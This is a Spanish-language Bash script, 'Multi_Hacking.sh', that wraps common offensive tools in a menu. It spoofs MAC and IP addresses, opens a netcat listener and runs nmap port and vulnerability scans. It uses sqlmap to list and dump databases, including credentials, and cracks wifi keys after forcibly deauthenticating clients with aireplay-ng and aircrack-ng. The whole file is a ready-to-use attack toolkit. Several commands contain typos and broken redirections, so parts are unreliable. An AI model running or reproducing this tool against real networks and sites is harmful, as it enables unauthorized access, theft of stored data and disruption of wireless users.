#!/bin/bash

# NOMBRE DEL SCRIPT: 'Multi_Hacking.sh'

# CREADOR: el_de_la_cuadra
# TIPO: Herramienta
# LANZAMIENTO: 08-07-2025

# Imprimir variables.
usuario=$(whoami)
creador='el_de_la_cuadra'
hora=$(date)
interfaz_red=$(ifconfig | grep "$interfaz")

# COLORES NORMALES
rojo="\e[1;31m"
verde="\e[1;32m"
morado="\e[1;35m"
amarillo="\e[1;33m"
cyan="\e[1;34m"
azul="\e[1;36m"
gris="\e[1;37m"
reset="\e[0m"

# COLORES LUMINOSOS.
rojo_b="\e[0;31m"
verde_b="\e[0;32m"
gris_b="\e[0;37m"
morado_b="\e[0;35m"

# COLORES PARPADEANTES.
rojo_p="\e[5;1;31m"
verde_p="\e[5;1;32m"
morado_p="\e[5;1;35m"
amarillo_p="\e[5;1;33m"
cyan_p="\e[5;1;34m"
azul_p="\e[5;1;36m"
gris_p="\e[5;1;37m"

# COLORES DE FONDO.
rojo_f="\e[1;37;41m"
verde_f="\e[1;37;42m"
morado_f="\e[1;37;45m"
amarillo_f="\e[1;37;43m"
cyan_f="\e[1;37;44m"
azul_f="\e[1;37;46m"
gris_f="\e[1;30;47m"

# COLORES SUBRAYADOS
rojo_s="\e[4;1;31m"
verde_s="\e[4;1;32m"
morado_s="\e[4;1;35m"
amarillo_s="\e[4;1;33m"
cyan_s="\e[4;1;34m"
azul_s="\e[4;1;36m"
gris_s="\e[4;1;37m"
amarillo_sb="\e[4;0;33m"

# Conceder permisos de super usuario.
if [ $(id -u) -ne 0 ]; then
       echo -e "${cyan_f}Usuario:${reset} ${gris}(${reset} ${morado_s}$usuario${reset} ${amarillo}):${reset}"
       echo ""
       echo -e "${gris}[${rojo}NO${gris}] podra ejecutar esta herramienta si no eres usuario root (${rojo_p}!${reset}${gris})${reset}"

exit

fi

# Imprimir banner.
Imprimir_banner() {
         clear
         echo -e "${verde}+ ${amarillo_f}Creditos:${reset}${gris}(${reset} ${morado_s}$creador${reset} ${gris})   ${verde}* ${amarillo_f}Date:${reset}${gris}(${reset} ${morado_s}$hora${reset} ${gris})${reset}"
         echo ""
         figlet "Multi Hacking"
         echo -e "${gris}(${verde}i${gris}) Bienvenido${reset}"
         echo ""
         echo -e "${gris}"
}

# Habilitar interfaz modo monitor.
Activar_Modo_Monitor() {
        echo -e "${gris}"
        read -p "Nombre De Interfaz=(" interfaz
        echo -e "${reset}"
        echo -e "${cyan}Configurando${gris}...${reset}"
        sleep 2
        echo -e "${morado}"
        airmon-ng start $interfaz
        echo -e "${reset}"
        echo -e "${gris}Interfaz Modo Monitor ${verde}-> ${gris}[${verde_s}HABILITADO${reset}${gris}]${reset}"
        sleep 2
        Imprimir_banner
}

# Desabilitar interfaz modo monitor.
Desactivar_Modo_Monitor() {
        echo ""
        echo -e "${cyan}Configurando${gris}...${reset}"
        sleep 2
        echo -e "${morado}"
        airmon-ng stop wlan0mon
        echo -e "${reset}"
        echo -e "${cyan}Interfaz Modo Monitor ${verde}-> ${gris}[${rojo_s}DESABILITADO${reset}${gris}]${reset}"
        sleep 2
        Imprimir_banner
}

# Instalar Dependencias.
Instalar_Dependencias() {
         Imprimir_banner
         echo -e "${rojo}Instalando Dependencias.${reset}"
         echo ""
         sleep 3
         echo -e "${verde}" && apt install ncat -y && apt install figlet -y && apt install toilet -y && apt install aircrack-ng -y && apt install nmap -y && apt install sqlmap -y && apt install whatweb -y && apt install python3 -y && echo -e "${reset}"
         echo ""
         echo -e "${amarillo}Dependencias Instaladas.${reset}"
         sleep 3
         Imprimir_banner
}

# Cambiar direccion ip.
Cambiar_ip() {
        echo -e "${gris}"
        read -p "Interfaz=(" interfaz
        sleep 1
        echo -e "${gris}"
        read -p "Que direcciom ip desea poner=(" ip
        sleep 1
        echo ""
        ifconfig $interfaz $ip up >/dev/null
        echo ""
        echo ""
        echo -e "${gris}(${rojo_p}!${reset}${gris}) ${gris}Esta Es Su Nueva Interfaz De Red ${gris}(${rojo_p}!${reset}${gris})${reset}"
        echo ""
        echo -e "$interfaz_red"
        sleep 4
        Imprimir_banner
}

# Cambiar la direccion mac.
Cambiar_mac() {
        echo -e "${gris}"
        read -p "Introduce la interfaz=(" interfaz
        sleep 1
        echo ""
        echo -e "${cyan}Configurando la interfaz de red${gris}...${reset}"
        sleep 5
        ifconfig $interfaz down >/dev/null
        echo -e "${cyan}"
        macchanger -A $interfaz
        echo -e "${reset}"
        echo -e "${morado}Levantando interfaz${gris}...${reset}"
        sleep 2
        ifconfig $interfaz up >/dev/null
        echo ""
        echo -e "${amarillo}Reiniciando los servicios para aplicar la configuracion${gris}...${reset}"
        sleep 3
        service networking restart >/dev/null
        echo ""
        echo -e "${gris}(${rojo_p}!${reset}${gris}) ${gris}Esta Es Su Nueva Direccion Mac (${rojo_p}!${reset}${gris})${reset}"
        echo ""
        echo -e "${azul}"
        macchanger $interfaz -s
        echo -e "${reset}"
        sleep 5
        Imprimir_banner
}

# Levantar servidor python.
Servidor_python() {
         echo -e "${gris}"
         read -p "Introduce el puerto para el servidor=(" port
         sleep 1
         echo -e "${gris}"
         echo -e "${cyan}Servidor Python Levantado, ${gris}Para Confirmar Coloque su Direccion (${rojo_s}IP${reset}${gris}) En El Navegador.${reset}"
         echo ""
         echo -e "${rojo}Presione Control + c Para Finalizar.${reset}"
         echo -e "${morado}"
         python3 -m http.server $port
         echo -e "${reset}"
         Imprimir_banner
}

# Puerto en escucha.
Puerto_escucha() {
       echo -e "${gris}"
       read -p "Introduce el puerto para la coneccion=(" port
       sleep 1
       echo -e "${reset}"
       echo -e "${morado}El puerto se encuentra en escucha esperando cualquier coneccion.${reset}"
       echo ""
       echo -e "${rojo}Presione Control + c Para Finalizar.${reset}"
       echo -e "${amarillo}"
       nc -lnvp $port
       echo -e "${reset}"
       Imprimir_banner
}

# Escanear direccion ip para analizar los puertos.
Escaneo_Puertos() {
        echo -e "${gris}"
        read -p "Introduce la direccion (IP) para analizar los puertos=(" ip
        sleep 1
        echo -e "${amarillo}"
        read -p "Como desea llamar al archivo=(" escaneo_puertos
        sleep 1
        echo ""
        echo -e "${verde_s}Guardando una copia del escaneo${reset}${gris}....${reset}"
        sleep 5
        nmap -sS --open -Pn $ip >/dev/null >> $escaneo_puertos
        echo ""
        echo "${cyan_s}Se Guardo La Copia.${reset}"
        Imprimir_banner
}

# Escanear direccion ip para analizar los servicios.
Escaneo_Servicios() {
        echo -e "${gris}"
        read -p "Introduce la direccion (IP) para analizar los servicios=(" ip
        sleep 1
        echo -e "${amarillo}"
        read -p "Como desea llamar al archivo=(" escaneo_servicios
        sleep 1
        echo ""
        echo -e "${verde_s}Guardando una copia del escaneo${reset}${gris}....${reset}"
        sleep 5
        nmap -sS -sC -sV --min-rate 2000 -Pn $ip >/dev/null >> $escaneo_servicios
        echo ""
        echo "${cyan_s}Se Guardo La Copia.${reset}"
        Imprimir_banner
}

# Escanear direccion ip para analizar las vulnerabilidades.
Escaneo_Vulnerabilidades() {
        echo -e "${gris}"
        read -p "Introduce la direccion (IP) para analizar las vulnerabilidades=(" ip
        sleep 1
        echo -e "${amarillo}"
        read -p "Como desea llamar al archivo=(" escaneo_vulnerabilidades
        sleep 1
        echo ""
        echo -e "${verde_s}Guardando una copia del escaneo${reset}${gris}...${reset}"
        sleep 5
        nmap --script "vulv" $ip >/dev/null >> $escaneo_vulnerabilidades
        echo ""
        echo "${cyan_s}Se Guardo La Copia.${reset}"
        Imprimir_banner
}

# Escanear direccion ip para analizar las tables.
Escaneo_Tablas() {
        echo -e "${gris}"
        read -p "Introduce la direccion (IP) para analizar los tablas=(" ip
        sleep 1
        echo -e "${amarillo}"
        read -p "Como desea llamar al archivo=(" escaneo_tables
        sleep 1
        echo ""
        echo -e "${verde_s}Guardando una copia del escaneo${reset}${gris}....${reset}"
        sleep 5
        sqlmap --url http://$ip/ --dbs --batch --forms --level=2 --risk=2 --random-angent  >/dev/null >> $escaneo_tables
        echo ""
        echo "${cyan_s}Se Guardo La Copia.${reset}"
        Imprimir_banner
}

# Escanear direccion ip para analizar las columnas.
Escaneo_Columnas() {
        echo -e "${gris}"
        read -p "Introduce la direccion (IP) para analizar las columnas=(" ip
        sleep 1
        echo -e "${amarillo}"
        read -p "Como desea llamar al archivo=(" escaneo_columnas
        sleep 1
        echo ""
        echo -e "${verde_s}Guardando una copia del escaneo${reset}${gris}....${reset}"
        sleep 5
        sqlmap --url http://$ip/ --columns --batch --forms --level=2 --risk=2 --random-angent  >/dev/null >> $escaneo_columnas
        echo ""
        echo "${cyan_s}Se Guardo La Copia.${reset}"
        Imprimir_banner
}

# Escanear direccion ip para analizar las credenciales.
Escaneo_Credenciales() {
        echo -e "${gris}"
        read -p "Introduce la direccion (IP) para analizar las credenciales=(" ip
        sleep 1
        echo -e "${amarillo}"
        read -p "Como desea llamar al archivo=(" escaneo_credenciales
        sleep 1
        echo ""
        echo -e "${verde_s}Guardando una copia del escaneo${reset}${gris}....${reset}"
        sleep 5
        sqlmap --url http://$ip/ --dump --batch --forms --level=2 --risk=2 --random-angent  >/dev/null >> $escaneo_credenciales
        echo ""
        echo "${cyan_s}Se Guardo La Copia.${reset}"
        Imprimir_banner
}

# Imprimir banner de hacking redes.
Imprimir_banner_redes() {
         clear
         echo -e "${verde}+ ${cyan_f}Creditos:${reset}${gris}(${reset} $creador ${gris})   ${verde}* ${cyan_f}Date:${gris}(${reset} $hora ${gris})${reset}"
         echo ""
         figlet "Hacking Redes"
         echo ""
         echo ""
}

# Escanear url con whatweb.
Escaneo_Whatweb() {
        echo -e "${gris}"
        read -p "Introduce la direccion (URL) de la paguina web=(" url
        sleep 1
        echo -e "${amarillo}"
        read -p "Como desea llamar al archivo=(" escaneo_whatweb
        sleep 1
        echo ""
        echo -e "${verde_s}Guardando una copia del escaneo${reset}${gris}....${reset}"
        sleep 5
        whatweb "$url" >> $escaneo_whatweb
        echo ""
        echo "${cyan_s}Se Guardo La Copia.${reset}"
        Imprimir_banner
}


# Ejecutar el crackeo de redes.
Crackear_wifi() {
         Imprimir_banner
         read -p "Introduce el nombre de la interfaz=(" interfaz
         sleep 1
         echo ""
         echo -e "${cyan}Mostrando las redes wifi disponibles${gris}...${reset}"
         sleep 3
         echo -e "${morado}"
         airodump-ng wlan0mon
         echo -e "${gris}"
         read -p "Introduce el (BSSID)=(" bssid
         sleep 1
         echo -e "${gris}"
         read -p "Introduce el nuemero de (CH)=(" chan
         sleep 1
         echo ""
         echo -e "${morado}Ejecutando Nueva Ventana De Terminal${gris}...${reset}"
         sleep 2
         gnome-terminal --geometry=568:425 -- bash -c './Captura.sh' &
         echo -e "${gris}"
         read -p "Introduce el numero de la (STATION)=(" station
         sleep 1
         echo -e "${reset}"
         echo -e "${gris}(${rojo_p}!${reset}${gris}) Desautenticando Cliente (${rojo_p}!${reset}${gris})${reset}"
         sleep 3
         echo -e "${rojo}"
         aireplay-ng -0 9 -a $bssid -c $station wlan0mon
         sleep 3
         aireplay-ng -0 9 -a $bssid -c $station wlan0mon
         sleep 3
         aireplay-ng -0 9 -a $bssid -c $station wlan0mon
         sleep 3
         aireplay-ng -0 9 -a $bssid -c $station wlan0mon
         sleep 3
         aireplay-ng -0 9 -a $bssid -c $station wlan0mon
         sleep 3
         echo -e "${reset}"
         echo -e "${gris}(${rojo_p}!${reset}${gris}) Intentando Desifrar La Clave Wifi Pre-Comprometida (${rojo_p}!${reset}${gris})${reset}"
         sleep 4
         echo -e "${amarillo}"
         aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $bssid $bssid/$bssid-01.cap
         echo -e "${reset}"
         echo -e "${amarillo}(((${gris_s}Terminado${reset}${amarillo})))${reset}"
         sleep 3
         echo -e "${rojo}"
         read -p "Presione [Enter] Para Finalizar."
         echo -e "${reset}"
         sleep 1
         Imprimir_banner
}

# Ejecutar script.
Imprimir_banner
while true; do
echo -e "${gris}1${rojo}) ${gris}Instalar Dependencias           ${gris}p${verde}) ${gris}Escaneo Puertos ${azul}(nmap)${reset}"
echo -e "${gris}2${rojo}) ${gris}Habilitar Modo Monitor          ${gris}s${verde}) ${gris}Escaneo Servicios"
echo -e "${gris}3${rojo}) ${gris}Deshabilitar Modo Monitor       ${gris}v${verde}) ${gris}Escaneo Vulnerabilidades"
echo -e "${gris}4${rojo}) ${gris}Cambiar Direccion ${azul}(ip)          ${gris}t${verde}) ${gris}Escaneo Tablas ${azul}(sqlmap)${reset}"
echo -e "${gris}5${rojo}) ${gris}Cambiar direccion ${azul}(mac)         ${gris}c${verde}) ${gris}Escaneo Columnas"
echo -e "${gris}6${rojo}) ${gris}Servidor Python                 ${gris}b${verde}) ${gris}Escaneo Credenciales"
echo -e "${gris}7${rojo}) ${gris}Puerto En Escucha ${azul}(nc)          ${gris}+${verde}) ${gris}Escaneo Paguina Web ${azul}(whatweb)${reset}"
echo -e "${gris}8${rojo}) ${gris}Crackear red wifi ${azul}(aircrack-ng)"
echo -e "${reset}"
echo -e "${amarillo}0 ${amarillo}Salir${reset}"
echo ""
echo -e "${gris}"
read -p "[Opcion]=(" opcion
echo -e "${reset}"
sleep 1
case $opcion in

              1) Instalar_Dependencias ;; 2) Activar_Modo_Monitor ;; 3) Desactivar_Modo_Monitor
                ;;
              4) Cambiar_ip ;; 5) Cambiar_mac ;; 6) Servidor_python ;; 7) Puerto_escucha
                ;;
              8) Crackear_wifi ;; p) Escaneo_Puertos ;; s) Escaneo_Servicios
                ;;
             v) Escaneo_Vulnerabilidades ;; t) Escaneo_Tablas ;; c) Escaneo_Culumns ;; b) Escaneo_Credenciales
                ;;
             +) Escaneo_Whatweb
                ;;
              0) echo "" && echo -e "${gris}<==[${rojo_s}Finalizado${reset}${gris}]...${reset}" && echo "" && sleep 3 && echo -e "${cyan_f}Gracias Por Su Preferencia.${reset} ${verde_f}Que Tenga Un Buen Dia.${reset} ${gris}:)${reset}" && exit
                ;;
              *) clear && echo "" && echo -e "${gris}Opcion [${rojo}NO${gris}] ${rojo}disponible ${gris}:(${reset}" && echo ""
                ;;
                   esac
done
